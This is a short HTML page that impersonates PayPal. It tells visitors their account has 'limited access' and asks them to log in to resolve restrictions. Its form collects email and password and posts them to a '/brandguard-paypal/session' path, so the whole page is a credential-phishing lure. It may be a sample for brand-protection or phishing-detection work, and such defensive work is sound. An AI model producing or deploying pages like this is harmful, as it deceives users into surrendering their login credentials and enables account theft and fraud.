<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PayPal Wallet Review</title>
  </head>
  <body>
    <main>
      <h1>PayPal limited access review</h1>
      <p>Log in to resolve account restrictions.</p>
      <form method="post" action="/brandguard-paypal/session">
        <label for="paypal-email">Email</label>
        <input id="paypal-email" name="email" type="email" autocomplete="username" />
        <label for="paypal-password">Password</label>
        <input id="paypal-password" name="password" type="password" autocomplete="current-password" />
        <button type="submit">Continue securely</button>
      </form>
    </main>
  </body>
</html>
